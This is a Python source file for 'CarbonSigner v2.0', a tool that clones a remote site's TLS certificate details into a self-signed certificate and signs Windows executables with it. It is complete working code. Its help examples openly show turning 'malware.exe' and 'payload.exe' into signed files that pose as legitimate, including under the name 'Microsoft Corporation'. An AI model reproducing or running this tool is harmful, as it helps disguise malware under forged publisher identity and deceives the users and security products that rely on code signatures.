#!/usr/bin/env python3
"""
CarbonSigner v2.0 - Advanced Certificate Spoofing & Code Signing Tool

Author: Paranoid Ninja & N3S3
Email: paranoidninja@protonmail.com
Description: Advanced SSL certificate spoofing and executable signing for security research
"""

import argparse
import sys
import ssl
import os
import subprocess
import tempfile
import hashlib
import json
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List

try:
    from OpenSSL import crypto
except ImportError:
    print("❌ PyOpenSSL not installed. Install with: pip install pyopenssl")
    sys.exit(1)

# Configuration
class Config:
    TIMESTAMP_SERVERS = [
        "http://timestamp.digicert.com",
        "http://timestamp.sectigo.com", 
        "http://sha256timestamp.ws.symantec.com/sha256/timestamp",
        "http://timestamp.comodoca.com"
    ]
    
    DEFAULT_SIGNING_NAME = "CarbonSigner Secure Applications"
    DEFAULT_VALIDITY_DAYS = 365
    SUPPORTED_SIGNING_TOOLS = ["osslsigncode", "signtool"]
    
    # Enhanced certificate extensions to mimic
    CERT_EXTENSIONS = [
        "keyUsage",
        "extendedKeyUsage", 
        "subjectKeyIdentifier",
        "authorityKeyIdentifier",
        "basicConstraints"
    ]

class CarbonSigner:
    def __init__(self, verbose: bool = False, output_dir: Path = None):
        self.verbose = verbose
        self.output_dir = output_dir or Path("carbon_certs")
        self.output_dir.mkdir(exist_ok=True)
        self.stats = {
            "certificates_created": 0,
            "files_signed": 0,
            "errors": 0
        }

    def log(self, message: str, level: str = "info"):
        """Enhanced logging with colors and levels"""
        colors = {
            "info": "\033[94m",      # Blue
            "success": "\033[92m",   # Green  
            "warning": "\033[93m",   # Yellow
            "error": "\033[91m",     # Red
            "debug": "\033[90m",     # Gray
            "reset": "\033[0m"       # Reset
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        level_icon = {
            "info": "ℹ️",
            "success": "✅", 
            "warning": "⚠️",
            "error": "❌",
            "debug": "🐛"
        }
        
        if self.verbose or level in ["error", "warning", "success"]:
            print(f"{colors.get(level, '')}{level_icon.get(level, '')} [{timestamp}] {message}{colors['reset']}")

    def fetch_certificate_details(self, host: str, port: int) -> Dict[str, Any]:
        """Fetch and analyze certificate from remote host"""
        self.log(f"Fetching certificate from {host}:{port}", "info")
        
        try:
            # Create SSL context with modern settings
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert_der = ssock.getpeercert(binary_form=True)
                    cert_pem = ssl.DER_cert_to_PEM_cert(cert_der)
                    
            x509 = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
            
            # Extract comprehensive certificate info
            cert_info = {
                'pem': cert_pem,
                'x509': x509,
                'subject': dict(x509.get_subject().get_components()),
                'issuer': dict(x509.get_issuer().get_components()),
                'serial': x509.get_serial_number(),
                'version': x509.get_version(),
                'not_before': x509.get_notBefore(),
                'not_after': x509.get_notAfter(),
                'pubkey_bits': x509.get_pubkey().bits(),
                'signature_algorithm': x509.get_signature_algorithm().decode(),
                'extensions': self._extract_extensions(x509)
            }
            
            self.log(f"Successfully fetched certificate (SN: {cert_info['serial']})", "success")
            return cert_info
            
        except Exception as e:
            self.log(f"Failed to fetch certificate: {str(e)}", "error")
            raise

    def _extract_extensions(self, x509) -> List[Dict]:
        """Extract certificate extensions"""
        extensions = []
        for i in range(x509.get_extension_count()):
            ext = x509.get_extension(i)
            extensions.append({
                'name': ext.get_short_name().decode(),
                'value': str(ext)
            })
        return extensions

    def create_spoofed_certificate(self, cert_info: Dict[str, Any], 
                                 validity_days: int = None) -> Dict[str, Any]:
        """Create a spoofed certificate based on the original"""
        self.log("Creating spoofed certificate", "info")
        
        try:
            # Generate new key pair
            key = crypto.PKey()
            key.generate_key(crypto.TYPE_RSA, cert_info['pubkey_bits'])
            
            # Create new certificate
            cert = crypto.X509()
            
            # Copy basic certificate info
            cert.set_version(cert_info['version'])
            cert.set_serial_number(self._generate_serial())
            cert.set_subject(cert_info['x509'].get_subject())
            cert.set_issuer(cert_info['x509'].get_issuer())
            
            # Set validity period
            validity_days = validity_days or Config.DEFAULT_VALIDITY_DAYS
            not_before = datetime.utcnow()
            not_after = not_before + timedelta(days=validity_days)
            
            cert.set_notBefore(not_before.strftime("%Y%m%d%H%M%SZ").encode())
            cert.set_notAfter(not_after.strftime("%Y%m%d%H%M%SZ").encode())
            
            # Add public key
            cert.set_pubkey(key)
            
            # Add extensions from original certificate
            self._copy_extensions(cert_info['x509'], cert)
            
            # Self-sign the certificate
            cert.sign(key, 'sha256')
            
            result = {
                'certificate': cert,
                'private_key': key,
                'original_info': cert_info
            }
            
            self.log("Spoofed certificate created successfully", "success")
            return result
            
        except Exception as e:
            self.log(f"Failed to create spoofed certificate: {str(e)}", "error")
            raise

    def _generate_serial(self) -> int:
        """Generate a random serial number"""
        return int.from_bytes(os.urandom(20), byteorder="big") >> 1

    def _copy_extensions(self, original_cert, new_cert):
        """Copy extensions from original certificate"""
        for i in range(original_cert.get_extension_count()):
            try:
                ext = original_cert.get_extension(i)
                new_cert.add_extensions([ext])
            except Exception as e:
                self.log(f"Could not copy extension {ext.get_short_name()}: {str(e)}", "warning")

    def save_certificate_files(self, spoofed_cert: Dict[str, Any], 
                             base_name: str) -> Dict[str, Path]:
        """Save certificate and key to files"""
        self.log(f"Saving certificate files with base name: {base_name}", "info")
        
        files = {}
        
        try:
            # Certificate file
            cert_file = self.output_dir / f"{base_name}.crt"
            with open(cert_file, 'wb') as f:
                f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, 
                                              spoofed_cert['certificate']))
            files['certificate'] = cert_file
            
            # Private key file
            key_file = self.output_dir / f"{base_name}.key"
            with open(key_file, 'wb') as f:
                f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, 
                                             spoofed_cert['private_key']))
            files['private_key'] = key_file
            
            # PFX/P12 file
            pfx_file = self.output_dir / f"{base_name}.pfx"
            p12 = crypto.PKCS12()
            p12.set_privatekey(spoofed_cert['private_key'])
            p12.set_certificate(spoofed_cert['certificate'])
            
            with open(pfx_file, 'wb') as f:
                f.write(p12.export())
            files['pfx'] = pfx_file
            
            # Certificate info file
            info_file = self.output_dir / f"{base_name}_info.json"
            cert_info = {
                'original_subject': str(spoofed_cert['original_info']['subject']),
                'original_issuer': str(spoofed_cert['original_info']['issuer']),
                'serial_number': spoofed_cert['certificate'].get_serial_number(),
                'validity': {
                    'not_before': spoofed_cert['certificate'].get_notBefore().decode(),
                    'not_after': spoofed_cert['certificate'].get_notAfter().decode()
                },
                'public_key_bits': spoofed_cert['original_info']['pubkey_bits'],
                'created_at': datetime.utcnow().isoformat()
            }
            
            with open(info_file, 'w') as f:
                json.dump(cert_info, f, indent=2)
            files['info'] = info_file
            
            self.log(f"Certificate files saved to {self.output_dir}", "success")
            return files
            
        except Exception as e:
            self.log(f"Failed to save certificate files: {str(e)}", "error")
            raise

    def verify_signing_tools(self) -> bool:
        """Verify required signing tools are available"""
        self.log("Verifying signing tools availability", "info")
        
        missing_tools = []
        
        if sys.platform == "win32":
            # Check for signtool on Windows
            try:
                subprocess.run(["signtool"], capture_output=True, timeout=5)
            except (subprocess.TimeoutExpired, FileNotFoundError):
                missing_tools.append("signtool.exe")
        else:
            # Check for osslsigncode on Linux/macOS
            try:
                subprocess.run(["osslsigncode", "--version"], capture_output=True, timeout=5)
            except (subprocess.TimeoutExpired, FileNotFoundError):
                missing_tools.append("osslsigncode")
        
        if missing_tools:
            self.log(f"Missing signing tools: {', '.join(missing_tools)}", "error")
            if sys.platform != "win32":
                self.log("Install osslsigncode with: sudo apt-get install osslsigncode", "warning")
            return False
            
        self.log("All required signing tools are available", "success")
        return True

    def sign_executable(self, input_file: Path, output_file: Path, 
                       pfx_file: Path, signing_name: str = None) -> bool:
        """Sign an executable using the spoofed certificate"""
        self.log(f"Signing {input_file} -> {output_file}", "info")
        
        if not input_file.exists():
            self.log(f"Input file not found: {input_file}", "error")
            return False
            
        signing_name = signing_name or Config.DEFAULT_SIGNING_NAME
        
        try:
            if sys.platform == "win32":
                return self._sign_windows(input_file, output_file, pfx_file, signing_name)
            else:
                return self._sign_linux(input_file, output_file, pfx_file, signing_name)
                
        except Exception as e:
            self.log(f"Signing failed: {str(e)}", "error")
            return False

    def _sign_windows(self, input_file: Path, output_file: Path,
                     pfx_file: Path, signing_name: str) -> bool:
        """Sign executable on Windows using signtool"""
        try:
            # Copy input file to output location
            shutil.copy2(input_file, output_file)
            
            # Try different timestamp servers
            for timestamp_server in Config.TIMESTAMP_SERVERS:
                try:
                    cmd = [
                        "signtool", "sign", "/v", "/f", str(pfx_file),
                        "/d", signing_name, "/tr", timestamp_server,
                        "/td", "SHA256", "/fd", "SHA256", str(output_file)
                    ]
                    
                    self.log(f"Attempting signing with {timestamp_server}", "debug")
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    
                    if result.returncode == 0:
                        self.log(f"Successfully signed with {timestamp_server}", "success")
                        return True
                    else:
                        self.log(f"Timestamp server {timestamp_server} failed: {result.stderr}", "warning")
                        
                except subprocess.TimeoutExpired:
                    self.log(f"Timestamp server {timestamp_server} timeout", "warning")
                    continue
                    
            self.log("All timestamp servers failed", "error")
            return False
            
        except Exception as e:
            self.log(f"Windows signing failed: {str(e)}", "error")
            return False

    def _sign_linux(self, input_file: Path, output_file: Path,
                   pfx_file: Path, signing_name: str) -> bool:
        """Sign executable on Linux/macOS using osslsigncode"""
        try:
            for timestamp_server in Config.TIMESTAMP_SERVERS:
                try:
                    cmd = [
                        "osslsigncode", "sign", "-pkcs12", str(pfx_file),
                        "-n", signing_name, "-i", timestamp_server,
                        "-in", str(input_file), "-out", str(output_file)
                    ]
                    
                    self.log(f"Attempting signing with {timestamp_server}", "debug")
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    
                    if result.returncode == 0:
                        self.log(f"Successfully signed with {timestamp_server}", "success")
                        return True
                    else:
                        self.log(f"Timestamp server {timestamp_server} failed: {result.stderr}", "warning")
                        
                except subprocess.TimeoutExpired:
                    self.log(f"Timestamp server {timestamp_server} timeout", "warning")
                    continue
                    
            self.log("All timestamp servers failed", "error")
            return False
            
        except Exception as e:
            self.log(f"Linux signing failed: {str(e)}", "error")
            return False

    def verify_signature(self, signed_file: Path) -> bool:
        """Verify the signature of a signed file"""
        self.log(f"Verifying signature of {signed_file}", "info")
        
        try:
            if sys.platform == "win32":
                cmd = ["signtool", "verify", "/v", "/pa", str(signed_file)]
            else:
                cmd = ["osslsigncode", "verify", str(signed_file)]
                
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.log("Signature verification successful", "success")
                return True
            else:
                self.log(f"Signature verification failed: {result.stderr}", "error")
                return False
                
        except Exception as e:
            self.log(f"Signature verification error: {str(e)}", "error")
            return False

    def generate_certificate_report(self, cert_files: Dict[str, Path]) -> str:
        """Generate a detailed report of the created certificate"""
        report = [
            "📊 CarbonSigner Certificate Report",
            "=" * 50,
            f"Generated: {datetime.utcnow().isoformat()}",
            f"Output Directory: {self.output_dir}",
            "",
            "📁 Generated Files:"
        ]
        
        for file_type, file_path in cert_files.items():
            if file_path.exists():
                size = file_path.stat().st_size
                report.append(f"  • {file_type}: {file_path.name} ({size} bytes)")
        
        return "\n".join(report)

def main():
    parser = argparse.ArgumentParser(
        description="CarbonSigner v2.0 - Advanced Certificate Spoofing & Code Signing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic certificate spoofing and signing
  %(prog)s --host example.com --port 443 --input malware.exe --output signed_malware.exe
  
  # With custom validity and signing name
  %(prog)s --host github.com --port 443 --input payload.exe --output legit.exe \\
    --validity 730 --name "Microsoft Corporation"
  
  # Verbose mode for debugging
  %(prog)s --host target.com --port 443 --input bad.exe --output good.exe -v
  
  # Custom output directory
  %(prog)s --host site.com --port 443 --input in.exe --output out.exe \\
    --output-dir /tmp/my_certs
        """
    )
    
    parser.add_argument("--host", required=True, help="Target hostname")
    parser.add_argument("--port", type=int, required=True, help="Target port (usually 443)")
    parser.add_argument("--input", required=True, type=Path, help="Input executable to sign")
    parser.add_argument("--output", required=True, type=Path, help="Output signed executable")
    parser.add_argument("--output-dir", type=Path, help="Output directory for certificates")
    parser.add_argument("--validity", type=int, default=365, help="Certificate validity in days")
    parser.add_argument("--name", help="Signing name description")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--verify", action="store_true", help="Verify signature after signing")
    
    args = parser.parse_args()
    
    # Import socket here to avoid dependency issues
    try:
        import socket
    except ImportError:
        print("❌ Socket module not available")
        return 1
    
    # Display banner
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║                CarbonSigner v2.0                  ║
    ║         Advanced Certificate Spoofing             ║
    ║              Authors: Paranoid Ninja & N3S3       ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    # Initialize CarbonSigner
    signer = CarbonSigner(verbose=args.verbose, output_dir=args.output_dir)
    
    try:
        # Verify tools
        if not signer.verify_signing_tools():
            return 1
        
        # Fetch certificate
        cert_info = signer.fetch_certificate_details(args.host, args.port)
        
        # Create spoofed certificate
        spoofed_cert = signer.create_spoofed_certificate(cert_info, args.validity)
        
        # Save certificate files
        base_name = f"{args.host}_{args.port}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}"
        cert_files = signer.save_certificate_files(spoofed_cert, base_name)
        
        # Sign executable
        if signer.sign_executable(args.input, args.output, cert_files['pfx'], args.name):
            signer.stats['files_signed'] += 1
            
            # Verify signature if requested
            if args.verify:
                signer.verify_signature(args.output)
        
        # Generate report
        report = signer.generate_certificate_report(cert_files)
        print("\n" + report)
        
        # Print summary
        print(f"\n🎉 Operation completed successfully!")
        print(f"📁 Certificates saved in: {signer.output_dir}")
        print(f"📄 Signed executable: {args.output}")
        
        return 0
        
    except KeyboardInterrupt:
        signer.log("Operation cancelled by user", "warning")
        return 1
    except Exception as e:
        signer.log(f"Fatal error: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    # Add missing import at global scope
    import shutil
    sys.exit(main())
